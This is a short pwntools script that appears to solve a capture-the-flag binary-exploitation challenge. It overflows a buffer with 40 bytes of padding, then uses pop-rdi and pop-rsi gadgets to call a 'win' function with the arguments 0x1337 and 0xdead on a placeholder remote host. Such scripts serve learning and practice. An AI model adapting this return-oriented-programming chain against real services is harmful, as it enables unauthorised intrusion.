from pwn import *

# setup process
p = remote("IP", PORT)

# address of win function
win_addr = p64(0x400757)

# ROP gadget addresses
rdi_addr = p64(0x4008e3)
rsi_addr = p64(0x4008e1)

# payload = 
# padding
# pop rdi + argument 1
# pop rsi + argument 2 + pop r15 (we dont need r15)
# return to win

payload = b'A' * 40
payload += rdi_addr + p64(0x1337)
payload += rsi_addr + p64(0xdead) + p64(0)
payload += win_addr 

# send payload
p.sendline(payload)
p.interactive()